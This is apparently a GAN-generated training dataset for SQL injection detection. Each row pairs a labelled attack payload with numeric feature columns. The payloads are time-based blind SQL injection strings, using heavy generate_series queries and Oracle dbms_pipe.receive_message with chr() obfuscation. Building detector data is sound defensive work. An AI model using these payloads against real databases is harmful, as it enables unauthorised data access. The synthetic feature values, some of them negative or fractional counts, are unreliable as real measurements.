id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000095,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.626752471178529,133.62657165527344,38.7769775390625,16.241779327392578,39.92300796508789,-0.004270038567483425,53.901161193847656,24.738691329956055,0.9873732924461365,0.29434090852737427,0.1775367110967636,0.3618007302284241,0.1447991281747818,3.6162900924682617,0.9846131801605225,0.693955659866333,0.9987147450447083,0.054666392505168915,0.04770025238394737,0.010256827808916569,4.376591682434082,3.7613608837127686,1.3573930263519287,0.02234877459704876,1.5151711702346802,0.2471775859594345,-0.0033517726697027683,0.08256834745407104,0.2224103957414627,0.5330004096031189,0.02368534356355667,-0.22278660535812378,0.04064086452126503,-0.013233374804258347,0.46145913004875183,1.7123432159423828,3.559117317199707,0.7144705057144165,0.6442553400993347,-0.04345538467168808,0.4192826747894287,0.4358143210411072,0.09887643903493881,-0.1128632053732872,0.18111921846866608,-0.0037327632308006287,-0.13572216033935547,0.09121550619602203,0.10502554476261139,0.17428931593894958,0.004784286022186279,0.08519533276557922,-0.0628635585308075,0.09562679380178452,0.015768378973007202,-0.17471279203891754,-0.005411749240010977,0.1884632259607315,-0.025755010545253754,0.291576623916626,-0.0938241183757782,-0.07284197211265564,-0.15201041102409363,2.4736249446868896,0.29991859197616577,0.03553124517202377,0.004263318143785,0.22846537828445435,0.04774270951747894,-0.05525518208742142,0.0643591657280922,-0.06343435496091843,0.20732057094573975,0.013686866499483585,0.20093092322349548,0.026482749730348587,0.8811740279197693,0.42623934149742126,-0.1438596546649933,0.11489392071962357,0.13868173956871033,5.320702075958252,1.0125064849853516,0.18486347794532776,0.011533744633197784,0.18443238735198975,0.02360863983631134,0.09327106177806854,0.005032619461417198
GAN_000096,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.6565471904024975,125.2127456665039,43.99098587036133,16.466398239135742,39.49592590332031,-0.0006702860700897872,54.90079879760742,26.01058578491211,1.280044674873352,0.24924308061599731,0.16754095256328583,0.3712102174758911,0.13691239058971405,3.5191755294799805,0.8672341704368591,1.2208291292190552,1.3142532110214233,0.039355553686618805,0.03894989937543869,-0.005380300339311361,4.372899532318115,3.980905532836914,1.3457270860671997,0.020827321335673332,1.4873236417770386,0.14582857489585876,0.007315493654459715,0.07796262204647064,0.30980220437049866,0.5062376260757446,0.019135134294629097,0.05045635253190994,0.05102792754769325,0.21774832904338837,0.5715490579605103,1.6925079822540283,2.482759952545166,0.5617189407348633,0.5550267696380615,-0.07596465200185776,0.4417913854122162,0.4677028954029083,0.021264642477035522,-0.1349366009235382,0.1709175556898117,-0.045104093849658966,-0.20574289560317993,0.09349921345710754,0.1025090217590332,0.15405941009521484,-0.10963656008243561,0.08355521410703659,-0.16956377029418945,0.21164470911026,-0.03554317727684975,-0.15796317160129547,0.008830247446894646,0.23872990906238556,0.07057209312915802,0.22385495901107788,-0.034735217690467834,0.08823516964912415,-0.145778626203537,2.121924638748169,0.491231769323349,0.023627009242773056,0.04271846264600754,-0.0016241520643234253,0.07493527233600616,-0.12255627661943436,0.10987366735935211,-0.22989584505558014,0.0470338799059391,0.024506893008947372,0.2963687479496002,0.10857842862606049,1.006899356842041,0.4232061505317688,-0.1526048481464386,0.02340598590672016,-0.05205616354942322,3.975090742111206,0.9843984842300415,0.22126871347427368,-0.21700459718704224,0.18977221846580505,0.04169026389718056,0.008487638086080551,-0.0009342800476588309
GAN_000097,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.5571376340585714,134.1517333984375,45.81852340698242,18.307083129882812,43.40458297729492,-0.011811166070401669,50.47300720214844,22.91229820251465,1.2558021545410156,0.29640722274780273,0.16634374856948853,0.3666236400604248,0.14005015790462494,3.612706422805786,1.1491819620132446,0.846684455871582,1.0978258848190308,0.03477109968662262,0.04647405818104744,0.01827053166925907,4.405316352844238,4.520688056945801,1.7104724645614624,0.01807386428117752,1.5347951650619507,0.1171514242887497,0.013727312907576561,0.2414722889661789,0.6719503998756409,0.46426311135292053,0.03240184858441353,-0.10376404970884323,0.07728397846221924,0.21006013453006744,0.49313682317733765,1.6379320621490479,2.880742311477661,0.6394512057304382,0.6087315082550049,-0.07224731147289276,0.416917085647583,0.4287141263484955,0.06935019791126251,-0.07218585163354874,0.03307950496673584,0.00576840341091156,-0.19900637865066528,0.1272149384021759,0.13430044054985046,0.12991228699684143,0.031117618083953857,0.0927567258477211,-0.1679561734199524,0.0025255829095840454,-0.0012381123378872871,-0.09577880799770355,0.004684021230787039,0.20823360979557037,0.0012067556381225586,0.1742878258228302,-0.0441116988658905,0.14886638522148132,-0.008200451731681824,1.7008613348007202,0.3205951154232025,0.037750307470560074,0.020619122311472893,0.03183063119649887,0.048922713845968246,-0.14110377430915833,0.025854092091321945,-0.25347572565078735,-0.024515997618436813,0.00890405848622322,0.13798017799854279,0.09984704852104187,0.8591549396514893,0.4492169916629791,-0.08045239001512527,0.07534099370241165,-0.053311705589294434,4.478191375732422,0.9491499066352844,0.19557933509349823,-0.15379884839057922,0.14542242884635925,-0.14686571061611176,-0.02154933102428913,-0.003065344411879778
GAN_000098,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.631960983540165,129.55105590820312,38.36698913574219,17.833782196044922,46.90235137939453,-0.01784260757267475,55.5206298828125,23.964067459106445,1.0661664009094238,0.3040209412574768,0.1646418422460556,0.3686744272708893,0.141915962100029,3.626843214035034,0.9637576937675476,0.8944997191429138,1.0781890153884888,0.05011528730392456,0.0669931098818779,0.019504941999912262,4.583673000335693,4.687105178833008,1.7758913040161133,0.025307003408670425,1.5148192644119263,0.20611955225467682,-0.004988084081560373,0.1069013774394989,0.14118672907352448,0.5233834981918335,0.012094058096408844,-0.1674763411283493,0.04436221346259117,-0.016273614019155502,0.5069224834442139,1.7668931484222412,3.584191083908081,0.6860484480857849,0.609077513217926,-0.05990135297179222,0.36747416853904724,0.44347935914993286,-0.05523890256881714,-0.16314437985420227,0.15555590391159058,-0.011848464608192444,-0.24667242169380188,0.10913471132516861,0.14788952469825745,0.14620040357112885,-0.029462292790412903,0.03467312455177307,-0.15421365201473236,0.02794109284877777,-0.02363671362400055,-0.22612164914608002,-0.004754523281008005,0.16853582859039307,0.011122822761535645,0.20253050327301025,0.06783139705657959,-0.03929761424660683,-0.13178959488868713,2.0047545433044434,0.18762537837028503,0.027592241764068604,0.0021765788551419973,0.006318047642707825,0.07828447967767715,0.03887205198407173,0.07502734661102295,-0.008792669512331486,0.0788591206073761,0.01922580972313881,0.37015143036842346,-0.019112925976514816,0.9844593405723572,0.522991955280304,-0.05706993490457535,0.11103995144367218,0.03784617781639099,4.880557060241699,1.005544662475586,0.2588312327861786,-0.12212991714477539,0.0952349528670311,-0.0345810130238533,0.16181063652038574,0.005993424449115992
GAN_000099,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5510428474671394,118.5499267578125,37.09503936767578,16.41347885131836,46.41337585449219,0.022385872900485992,53.56562042236328,24.387292861938477,1.1261600255966187,0.28922659158706665,0.16146662831306458,0.37921395897865295,0.13762910664081573,3.6112685203552246,0.7744044661521912,1.0277539491653442,1.1909383535385132,0.05346667394042015,0.10502365231513977,0.03268057107925415,3.8805675506591797,4.2344489097595215,1.698030948638916,0.028594039380550385,1.5010523796081543,0.3928656578063965,0.0011337430914863944,0.18608665466308594,1.0030733346939087,0.5358271598815918,0.03384766727685928,-0.1131928339600563,0.04555187374353409,0.1510227918624878,0.52250736951828,1.6442292928695679,2.4650399684906006,0.48074397444725037,0.5419101119041443,-0.2033592015504837,0.4205136001110077,0.46844857931137085,0.03482998535037041,-0.035235702991485596,0.09287197887897491,-0.183704674243927,-0.2564181387424469,0.1282716542482376,0.1930134892463684,0.12856654822826385,-0.006995603442192078,0.019225381314754486,-0.16114956140518188,0.0596262589097023,-0.088569276034832,-0.09061221778392792,-0.006048084702342749,0.24809841811656952,-0.19660259783267975,-0.0879376009106636,0.19526326656341553,0.1268993765115738,-0.18597453832626343,1.7568618059158325,0.3186216950416565,0.02990737184882164,-0.0022115076426416636,0.12131430953741074,0.14095617830753326,0.0038638487458229065,-0.03464970737695694,-0.41716715693473816,-0.15366239845752716,0.01577753573656082,0.19704842567443848,0.037065912038087845,1.0227251052856445,0.29496610164642334,-0.08162695914506912,0.06071201711893082,-0.09539763629436493,3.812513828277588,0.9615403413772583,0.13909563422203064,-0.36442458629608154,0.1587235927581787,-0.0634695366024971,0.07086718082427979,-0.014713708311319351
GAN_000100,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.7199600849404555,126.41917419433594,33.685001373291016,15.474995613098145,41.93828582763672,-0.0012898967834189534,59.209442138671875,25.627763748168945,1.0185966491699219,0.29627668857574463,0.1637682467699051,0.3690308928489685,0.14462532103061676,3.5792136192321777,0.7595146298408508,0.9605374336242676,0.9702375531196594,0.05030617117881775,0.028011666610836983,0.0063378033228218555,4.388302326202393,4.0253472328186035,1.366025447845459,0.03548147901892662,1.6301522254943848,0.26683515310287476,-0.008042058907449245,0.05322970822453499,-0.2957778871059418,0.5374658703804016,0.01173474919050932,-0.09307703375816345,0.009090281091630459,-0.06315596401691437,0.5465604066848755,1.7721542119979858,3.0071799755096436,0.5743628144264221,0.6636930704116821,0.004997514188289642,0.4261627197265625,0.4633414149284363,-0.12557564675807953,-0.14361238479614258,0.29793649911880493,-0.004376500844955444,-0.3390626311302185,0.07160207629203796,0.06762044876813889,0.16189149022102356,-0.07138541340827942,0.08357630670070648,-0.2880951762199402,0.20257136225700378,0.12058562785387039,-0.4203476309776306,-0.02037840709090233,0.11079269647598267,0.24910162389278412,0.19762226939201355,0.06712770462036133,0.016660749912261963,-0.25215795636177063,2.1438891887664795,0.26370447874069214,0.03956689313054085,0.01125431526452303,0.329359233379364,-0.0070669446140527725,-0.030263222754001617,0.057528410106897354,-0.029240962117910385,0.11825721710920334,0.015399975702166557,0.3573818802833557,0.04667111486196518,0.9543450474739075,0.4752695560455322,-0.13175928592681885,0.05028389394283295,0.1491275280714035,5.023549556732178,1.0402400493621826,0.22697506844997406,-0.07563658058643341,-0.008706532418727875,-0.1733875423669815,0.27497434616088867,0.003981586545705795
GAN_000101,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.687051620802905,124.94580078125,31.606334686279297,18.284658432006836,48.411014556884766,-0.0374889113008976,64.24837493896484,26.734359741210938,1.1555018424987793,0.26557883620262146,0.1635078638792038,0.3606882691383362,0.1427677571773529,3.658658981323242,1.2064334154129028,0.995986819267273,1.1129556894302368,0.06030964478850365,0.04929245635867119,0.02689315937459469,4.372684955596924,3.9656879901885986,1.703429102897644,0.01533716544508934,1.4904999732971191,0.24221591651439667,-0.03828670084476471,0.03654162958264351,0.2601105570793152,0.561103105545044,0.03082776628434658,-0.3440336585044861,0.07745248824357986,0.1891721934080124,0.5171617865562439,1.7118033170700073,2.6441757678985596,0.5007023215293884,0.5050696134567261,-0.14374852180480957,0.4551354944705963,0.4060415029525757,0.016977518796920776,-0.05111008882522583,0.20405010879039764,0.10040728747844696,-0.10356783866882324,0.12938562035560608,0.176606222987175,0.1879618763923645,-0.028281033039093018,0.10682439804077148,-0.18857291340827942,-0.22010231018066406,-0.19561512768268585,-0.07611557841300964,-0.004128217231482267,0.24694353342056274,-0.08225071430206299,0.24965646862983704,-0.06804244220256805,0.3626910150051117,-0.12321916967630386,2.339425563812256,0.09714866429567337,0.028118185698986053,-0.00996506866067648,0.15136748552322388,0.14331883192062378,-0.05614381283521652,-0.12773573398590088,-0.11136524379253387,0.16239051520824432,0.026614533737301826,0.2900913953781128,0.05384001135826111,0.9075843691825867,0.30255571007728577,-0.1333601176738739,0.08367059379816055,-0.1751604825258255,4.389928817749023,1.0376794338226318,0.3813597857952118,-0.43331408500671387,0.15361623466014862,-0.022601835429668427,0.358505517244339,0.006460115779191256
GAN_000102,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.880144793750119,119.56841278076172,40.60335159301758,15.846627235412598,44.33411407470703,-0.05756521224975586,56.5556755065918,26.99026107788086,1.102565050125122,0.23356568813323975,0.15801142156124115,0.3775647282600403,0.13778583705425262,3.5634446144104004,0.9436777234077454,1.529727816581726,1.4441514015197754,0.032283853739500046,0.12135317176580429,0.008733104914426804,5.396397590637207,4.425378799438477,1.5759387016296387,0.016865676268935204,1.3373199701309204,0.3222862184047699,0.009062566794455051,-0.12968586385250092,0.8076826333999634,0.6163844466209412,0.013566222041845322,-0.14388124644756317,-0.005589679349213839,0.13904191553592682,0.5161542892456055,1.6557235717773438,2.5565297603607178,0.5741328597068787,0.5455542802810669,-0.20030477643013,0.5027405023574829,0.46501749753952026,-0.029582835733890533,-0.12094036489725113,0.24107997119426727,-0.20137205719947815,-0.1426144540309906,0.15714222192764282,0.1755407601594925,0.2294197678565979,-0.12411658465862274,0.04564535617828369,-0.0709267109632492,0.2228177785873413,-0.20484700798988342,-0.3332313895225525,0.006822945550084114,0.24401189386844635,0.025441929697990417,0.329695463180542,0.09132510423660278,0.0321338027715683,-0.358163982629776,1.7259114980697632,0.45855143666267395,0.02711769938468933,0.007418482564389706,0.25201961398124695,0.11455892771482468,0.045251719653606415,-0.1503351330757141,-0.2759735882282257,0.06667011231184006,0.009629778563976288,0.563287079334259,-0.08883422613143921,1.1018807888031006,0.273849219083786,-0.19631272554397583,-0.00598525907844305,-0.08927181363105774,2.956516981124878,1.0648868083953857,0.17203295230865479,-0.4121006727218628,0.262069433927536,0.2709999978542328,0.1546725183725357,-0.00026572225033305585
GAN_000103,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.9451419398200183,137.52745056152344,31.923612594604492,13.154623985290527,36.53523635864258,-0.02980371192097664,63.918758392333984,29.211435317993164,0.9283508658409119,0.23520827293395996,0.19107742607593536,0.3652413785457611,0.14275284111499786,3.5853941440582275,0.7318761944770813,1.1379575729370117,1.0147600173950195,0.05205028876662254,0.047178614884614944,-0.013066866435110569,3.834277868270874,3.6519691944122314,0.6762226819992065,0.01600632630288601,1.5863474607467651,0.2738550007343292,-0.023042770102620125,-0.17171500623226166,0.28409573435783386,0.5651329755783081,0.032779280096292496,-0.10124428570270538,0.02452392503619194,-0.01578265056014061,0.530880868434906,1.6284466981887817,3.012247085571289,0.6572746634483337,0.6297717094421387,0.059975117444992065,0.379590779542923,0.3899663984775543,-0.08537590503692627,0.024214498698711395,0.25171959400177,-0.1345052719116211,0.04991656541824341,0.03130581974983215,0.11617002636194229,0.19541501998901367,-0.1338726282119751,0.042607493698596954,-0.10546126961708069,0.13039860129356384,-0.16689138114452362,-0.2723604440689087,-0.012681053951382637,0.21953098475933075,0.0786987841129303,0.3461742401123047,-0.04967952147126198,-0.09160122275352478,-0.17003414034843445,2.2231321334838867,0.45065242052078247,0.01084151677787304,0.029737675562500954,0.4419237971305847,-0.06069876253604889,-0.009327754378318787,0.041302233934402466,-0.05861445143818855,0.35799333453178406,0.026742607355117798,0.3064706027507782,0.004650872200727463,1.0299235582351685,0.42593565583229065,-0.29551395773887634,0.08189443498849869,0.32290393114089966,4.318087100982666,1.0627467632293701,0.12867562472820282,0.06730398535728455,0.11021658778190613,0.273643434047699,0.07191576063632965,-2.294042133144103e-05
GAN_000104,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000192,3.800147075679937,125.37505340576172,34.19695281982422,16.258590698242188,45.118003845214844,-0.02952059730887413,62.84235382080078,26.829864501953125,0.7947854399681091,0.2641403079032898,0.1915406733751297,0.3617846965789795,0.1392635852098465,3.665360689163208,1.1365211009979248,0.7666234970092773,0.969581663608551,0.048610787838697433,0.051655177026987076,0.043317198753356934,3.1248996257781982,4.714644908905029,1.5983898639678955,0.017478711903095245,1.43507981300354,0.18985074758529663,-0.05914745479822159,0.05077281966805458,0.6253517270088196,0.4759773015975952,0.022696055471897125,-0.1951218992471695,0.11670833826065063,0.14768776297569275,0.5428525805473328,1.5442490577697754,2.7514841556549072,0.7999577522277832,0.5331922173500061,-0.034095507115125656,0.3163599967956543,0.4351118803024292,-0.03844524919986725,-0.05086047947406769,0.05908806622028351,0.005422577261924744,0.13580751419067383,0.1148967444896698,0.18425947427749634,0.16781629621982574,-0.017163142561912537,0.0116351917386055,0.016985688358545303,-0.23658651113510132,-0.2509998381137848,-0.05610828101634979,-0.002283781301230192,0.33461928367614746,-0.07891485095024109,0.24187731742858887,-0.1248505711555481,-0.040084876120090485,-0.04688947647809982,2.642082691192627,0.18177945911884308,0.008699681609869003,-0.00917589571326971,0.11083900183439255,0.1631043255329132,0.06498072296380997,0.036007367074489594,-0.18611305952072144,0.21546326577663422,0.029766926541924477,0.03521285951137543,-0.06468060612678528,1.10279381275177,0.4572671949863434,-0.21159330010414124,0.12149613350629807,0.1791146695613861,3.9053919315338135,1.024682641029358,0.2777824401855469,-0.2082708477973938,0.08847621083259583,0.1535019725561142,-0.02912098355591297,0.002815041458234191
GAN_000105,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.540996773334858,142.26510620117188,42.38423538208008,18.10028648376465,50.361663818359375,0.006899003405123949,50.81179428100586,22.173011779785156,1.0767803192138672,0.3166816532611847,0.16021724045276642,0.3714287281036377,0.14294953644275665,3.6442148685455322,1.1145378351211548,0.940106213092804,1.078171968460083,0.05328648164868355,0.06519462913274765,0.014019920490682125,3.6288199424743652,4.6761674880981445,1.5363352298736572,0.023223131895065308,1.614121675491333,0.15953880548477173,0.006098510231822729,0.2147638350725174,0.6205766797065735,0.5146480798721313,0.0255443025380373,-0.0903710201382637,0.07285590469837189,0.0016739219427108765,0.4653390347957611,1.6131700277328491,3.250852584838867,0.7383984327316284,0.6443508267402649,-0.027253925800323486,0.29643699526786804,0.424165278673172,0.0013889074325561523,0.06572563946247101,-0.02273421734571457,0.01477593183517456,-0.24219343066215515,0.1227545291185379,0.09793154895305634,0.10868623852729797,0.06685389578342438,0.1008853018283844,-0.14498606324195862,0.06866363435983658,-0.00934623833745718,-0.07928594946861267,-0.0068049062974750996,0.15081021189689636,-0.01624886691570282,-0.05527731031179428,0.00916115939617157,-0.0367954783141613,-0.08727920800447464,1.8862676620483398,0.19689935445785522,0.009207520633935928,0.01033422164618969,0.09911558777093887,0.09152180701494217,0.07217410951852798,0.1065959483385086,-0.06540396809577942,0.01572098582983017,0.03039678744971752,0.2037057876586914,0.1242341697216034,0.8652370572090149,0.47579795122146606,0.012038208544254303,0.09285621345043182,0.07249671220779419,5.103598117828369,0.9240977168083191,0.023490048944950104,-0.08203497529029846,0.10042761266231537,-0.06939423084259033,0.05919896438717842,-0.00691781984642148
GAN_000106,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.8153787421852337,126.34274291992188,40.50165557861328,15.197940826416016,44.141353607177734,-0.0049784863367676735,54.35893249511719,24.027576446533203,1.0455628633499146,0.28160953521728516,0.18722787499427795,0.3751877248287201,0.13463011384010315,3.6058602333068848,0.6287859678268433,1.0705405473709106,1.0817712545394897,0.05675986409187317,0.09839993715286255,0.012208831496536732,4.251986026763916,4.1236491203308105,1.1991896629333496,0.016273103654384613,1.5224894285202026,0.3469782769680023,-0.005031720269471407,0.08202745020389557,0.9165070056915283,0.5160834789276123,0.03685035556554794,-0.257658988237381,0.0554334931075573,-0.10568322241306305,0.44068610668182373,1.718648910522461,3.398461103439331,0.8861106634140015,0.6219406723976135,-0.102061927318573,0.35972821712493896,0.37376168370246887,0.015156768262386322,0.04656151682138443,0.05718222260475159,-0.35715481638908386,-0.05796074867248535,0.14001122117042542,0.16729046404361725,0.1648186445236206,0.020145311951637268,-0.016034215688705444,-0.18057450652122498,0.21320459246635437,-0.028848782181739807,-0.10740873217582703,-0.0028775096870958805,0.15210288763046265,-0.13842923939228058,0.26283082365989685,0.06940197944641113,-0.13711628317832947,-0.14457562565803528,2.282038450241089,0.4137547016143799,0.026126433163881302,0.00898583885282278,0.17888960242271423,0.08311664313077927,0.07660691440105438,0.15682604908943176,-0.12823571264743805,0.1516759991645813,0.0032025575637817383,0.38375675678253174,-0.09133148193359375,0.9823957085609436,0.5103477239608765,-0.17725825309753418,0.12058218568563461,0.1804056614637375,3.8936855792999268,0.9849366545677185,0.18987470865249634,0.08401015400886536,0.24569547176361084,0.15389028191566467,-0.13106569647789001,0.007019620388746262
GAN_000107,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.573828756000064,125.24889373779297,33.92648696899414,16.89104652404785,48.33786392211914,-0.004908683709800243,60.56211853027344,24.80524444580078,1.1464571952819824,0.25694504380226135,0.16806389391422272,0.35783398151397705,0.14315581321716309,3.625295400619507,1.0567491054534912,0.8699831366539001,1.0325801372528076,0.0501229353249073,0.0219874307513237,0.021071871742606163,3.5765371322631836,4.099655628204346,1.533614993095398,0.017085544764995575,1.539517879486084,0.16689202189445496,-0.03723172843456268,0.10146595537662506,0.09192278236150742,0.556320309638977,0.032257162034511566,-0.1465732604265213,0.03883681073784828,0.14172519743442535,0.4958106279373169,1.6232129335403442,2.7391695976257324,0.37367257475852966,0.47425469756126404,0.013596974313259125,0.3863655626773834,0.498762845993042,0.0760478600859642,-0.15522950887680054,0.1459217369556427,0.1426575481891632,-0.20699316263198853,0.0916210263967514,0.11463288217782974,0.13310149312019348,-0.04933330416679382,0.11447790265083313,-0.10797995328903198,-0.07225975394248962,-0.012873315252363682,-0.14224228262901306,-0.010648943483829498,0.20922842621803284,0.027244463562965393,0.1054806262254715,-0.07233358919620514,0.22674903273582458,-0.03078349679708481,2.0441269874572754,0.11673944443464279,0.023949438706040382,-0.0016365499468520284,0.16337043046951294,0.1462317407131195,-0.09008496254682541,-0.023137375712394714,-0.09010089933872223,0.09548339247703552,0.033746618777513504,0.15437860786914825,0.17602016031742096,0.9402171969413757,0.37926965951919556,-0.17660969495773315,0.06785281002521515,0.07475874572992325,5.05517053604126,1.003668189048767,0.3143423795700073,-0.2600439786911011,-0.04302341490983963,-0.12080775201320648,0.35715728998184204,-0.003963825758546591
GAN_000108,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.525439726715464,126.01163482666016,43.47944259643555,15.50883960723877,42.77124786376953,-0.003610582323744893,52.60335159301758,26.658309936523438,1.2026989459991455,0.26532578468322754,0.17288868129253387,0.3574567437171936,0.14160050451755524,3.6105151176452637,1.0563205480575562,0.9316588044166565,1.2063913345336914,0.029469072818756104,0.0647946447134018,0.003852596040815115,4.796224117279053,4.269530773162842,1.5064553022384644,0.01632601022720337,1.513241171836853,0.07153868675231934,-0.004329000134021044,0.039259810000658035,0.1926506906747818,0.5641082525253296,0.013894706033170223,-0.059381961822509766,0.07789525389671326,0.2725487947463989,0.5861427187919617,1.607217788696289,2.4951906204223633,0.6271336674690247,0.6179746985435486,-0.013488750904798508,0.4204164445400238,0.44234761595726013,0.09847541153430939,-0.1107952818274498,0.015187479555606842,0.06684082746505737,-0.20613127946853638,0.08379237353801727,0.1294649839401245,0.15581916272640228,-0.10419468581676483,0.07082780450582504,-0.12307481467723846,-0.0012766942381858826,-0.006672840565443039,-0.3271026015281677,-0.007828962989151478,0.018492188304662704,0.16993536055088043,0.21020928025245667,-0.11833671480417252,0.011281698942184448,0.045738495886325836,1.8903988599777222,0.23739716410636902,0.012175090610980988,0.022170569747686386,-0.0029464662075042725,0.1064232885837555,-0.005652815103530884,0.13716086745262146,-0.04404938220977783,0.2530929446220398,0.02817321941256523,0.2621273696422577,-0.015643518418073654,0.968165397644043,0.44875383377075195,-0.2895735502243042,0.028936849907040596,0.060543276369571686,4.152569770812988,1.00492525100708,0.19093841314315796,-0.14153672754764557,0.08981166034936905,0.012979984283447266,0.11223487555980682,0.006836478132754564
